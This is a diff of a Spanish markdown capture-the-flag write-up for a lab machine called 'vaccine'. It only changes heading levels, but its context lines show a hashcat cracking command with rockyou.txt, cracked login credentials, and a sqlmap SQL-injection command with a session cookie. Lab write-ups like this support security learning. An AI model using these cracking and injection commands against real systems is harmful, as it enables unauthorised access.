@@ -98,7 +98,7 @@ hashcat -a 0 -m 0 passwhash /usr/share/wordlists/rockyou.txt
 
 ![[2023-10-11_18-14.png]]
 
-###### iniciamos con las credenciales que hemos conseguido
+### iniciamos con las credenciales que hemos conseguido
 ```python
 --admin
 --qwerty789
@@ -126,7 +126,7 @@ sqlmap --current-db -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESS
 ------------------------------------------------------
 ```
 
-###### Podemos ver que el resultado:
+### Podemos ver que el resultado:
 ![[2023-10-11_19-11.png]]
 
 ###### Podemos notar que existen 4 tipos de inyecciones SQLI y que el nombre de la base de datos es public
